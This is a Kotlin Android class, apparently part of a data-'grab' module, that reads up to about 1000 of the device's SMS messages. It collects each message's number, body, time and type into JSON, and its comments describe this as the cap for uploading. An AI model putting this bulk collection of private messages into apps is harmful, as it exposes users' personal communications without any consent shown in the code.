package com.qit.sms

import android.content.Context
import android.database.Cursor
import android.database.sqlite.SQLiteException
import android.net.Uri
import android.text.TextUtils
import android.util.Log
import com.qit.base.GrabController
import com.qit.base.Util
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.UnsupportedEncodingException

/**
 * Author：zhonglq
 * Time：2018/9/10 下午2:26
 * Description：短信相关管理器
 */
class SmsController(private val context: Context) : GrabController() {
    override fun doCall() {
        runWorkThread(Runnable {
            mListener?.onReceive(mType, querySmsRecords())
        })
    }

    private fun querySmsRecords(): String {
        val array = JSONArray()
        val resolver = context.contentResolver
        var cur: Cursor? = null
        try {
            cur = resolver.query(CONTENT_URI, null, null, null, "date desc")
            if (cur != null && cur.moveToFirst()) {
                var phoneNumber: String
                var smsBody: String

                val phoneNumberColumn = cur.getColumnIndex("address")
                val smsBodyColumn = cur.getColumnIndex("body")
                val dateColumn = cur.getColumnIndex("date")
                val typeColumn = cur.getColumnIndex("type")

                do {
                    var number = cur.getString(phoneNumberColumn)
                    if (TextUtils.isEmpty(number)) {
                        number = ""
                    }
                    phoneNumber = number
                    smsBody = cur.getString(smsBodyColumn)

                    if (array.length() > MAX_UPLOAD_COUNT) {
                        break
                    }

                    val entity = JSONObject()
                    try {
                        entity.put("phone", phoneNumber)
                        if (!TextUtils.isEmpty(smsBody)) {
                            entity.put("content", Util.filterOffUtf8Mb4(smsBody))
                        } else {
                            entity.put("content", "")
                        }

                        val time = cur.getLong(dateColumn)
                        entity.put("time", time)
                        entity.put("type", cur.getInt(typeColumn))
                        array.put(entity)
                    } catch (e: JSONException) {
                        Log.v(TAG, "json encode 编码出错", e)
                    } catch (e: UnsupportedEncodingException) {
                        e.printStackTrace()
                    }

                } while (cur.moveToNext())
            }
        } catch (ex: SQLiteException) {
            Log.v(TAG, "获取短信列表出错", ex)
        } finally {
            cur?.close()
        }
        return array.toString()
    }

    companion object {

        private val TAG = "SMS"

        /**
         * 短信上报最大条数
         */
        private val MAX_UPLOAD_COUNT = 1000

        /**
         * 单个发送者短信上报条数
         */
        private val MAX_SESSION_UPLOAD_COUNT = 500

        private val QUERY_WHERE_CONDITION = SmsObserver.Sms.READ + " = ? "
        private val QUERY_WHERE_PARAMS = arrayOf(" 0 ")

        /**
         * The `content://` style URL for this table.
         */
        private val CONTENT_URI = Uri.parse("content://sms")

        private val PROJECTION = arrayOf("address", "person", //
            "body", "date", "type")
    }
}
